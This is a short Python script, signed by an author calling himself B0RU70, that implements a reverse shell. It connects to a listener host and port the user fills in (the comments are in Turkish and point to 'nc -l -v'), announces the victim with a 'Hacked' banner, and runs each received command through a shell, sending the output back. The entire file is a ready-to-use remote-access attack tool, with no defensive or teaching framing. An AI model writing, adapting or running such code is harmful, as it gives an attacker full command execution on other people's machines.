#!/usr/bin/python
# -*- coding:utf-8 -*-

import socket,subprocess

#nc -l -v actigin port
host = "ipni yazican"
port = actigin port
#balas total
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

#launcher mode
#server connect
s.connect((host,port))
#sen msj
s.send('[*]B0RU70 - Hacked =')

#code by B0RU70

while 1 :
    #kayida al
    data = s.recv(1024)

    #code by B0RU70
    if data == "quit" : break

    #code by B0RU70
    proc = subprocess.Popen(data, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
    #code by B0RU70

    #code by B0RU70
    output_valeurs = proc.stdout.read() + proc.stderr.read()

    #code by B0RU70
    s.send(output_valeurs)

#MyWebSite B0RU70.BLOGSPOT.COM
s.close()
